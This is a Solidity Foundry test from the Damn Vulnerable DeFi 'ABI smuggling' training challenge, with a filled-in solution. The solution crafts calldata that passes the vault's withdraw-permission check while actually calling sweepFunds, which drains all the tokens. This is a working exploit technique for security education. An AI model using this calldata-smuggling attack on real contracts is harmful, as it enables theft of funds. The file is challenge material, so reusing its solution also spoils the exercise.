// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(
            hex"85fb709d",
            deployer,
            address(vault)
        );
        bytes32 playerPermission = vault.getActionId(
            hex"d9caed12",
            player,
            address(vault)
        );
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes4 withdrawSig = bytes4(
            keccak256("withdraw(address,address,uint256)")
        ); //0xd9caed1200000000000000000000000000000000000000000000000000000000
        bytes4 sweepFundsSig = bytes4(keccak256("sweepFunds(address,IERC20)"));
        //0x97c540ba00000000000000000000000000000000000000000000000000000000
        bytes4 executeSig = bytes4(keccak256("execute(address,bytes)"));

        bytes memory callData = abi.encodePacked(
            vault.execute.selector, //[0-4]函数选择器忽略
            abi.encode(address(vault)), //[0-20]
            abi.encode(0x64), //pointer 0x80 [20-40]
            abi.encode(1), //random data [40-60]
            vault.withdraw.selector, //permission check完成 [60-64]
            abi.encode(0x44), //数据大小,4字节选择器+20+20俩address
            abi.encodeWithSelector( // Remaining bytes for the actual sweepFunds call
                vault.sweepFunds.selector,
                recovery,
                address(token)
            )
        );
        bytes memory maliciousCalldata = abi.encodePacked(
            vault.execute.selector, // 4 bytes
            abi.encode(address(vault)), // 32 bytes (padded address)
            abi.encode(0x64), // 32 bytes (offset to actionData, 100 in decimal)偏移32*3+4字节
            abi.encode(0x00), // 32 bytes (padded zero)
            bytes4(0xd9caed12), // 4 bytes (selector for permission check)
            abi.encode(0x44), // 32 bytes (length of actionData, 68 in decimal)
            abi.encodeWithSelector( // Remaining bytes for the actual sweepFunds call
                vault.sweepFunds.selector,
                recovery,
                address(token)
            )
        );

        console.logBytes(callData);
        console.logBytes(maliciousCalldata);
        address(vault).call(callData);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
